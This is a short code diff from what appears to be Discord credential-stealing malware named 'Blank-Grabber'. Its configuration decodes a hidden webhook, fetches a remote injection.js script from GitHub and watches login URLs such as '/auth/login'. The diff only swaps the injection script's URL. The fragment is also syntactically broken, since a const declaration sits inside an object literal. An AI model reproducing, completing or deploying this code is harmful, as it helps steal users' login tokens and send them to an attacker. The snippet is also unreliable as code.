@@ -14,7 +14,7 @@ const {
 const CONFIG = {
     const webhook = '%WEBHOOKHEREBASE64ENCODED%'
     webhook: atob(webhook),
-    injection_url: "https://raw.githubusercontent.com/haiAzure/discord-injection/main/injection.js",
+    injection_url: "https://raw.githubusercontent.com/haiAzure/Blank-Grabber/injectionandsomething/injection.js",
     filters: {
         urls: [
             '/auth/login',
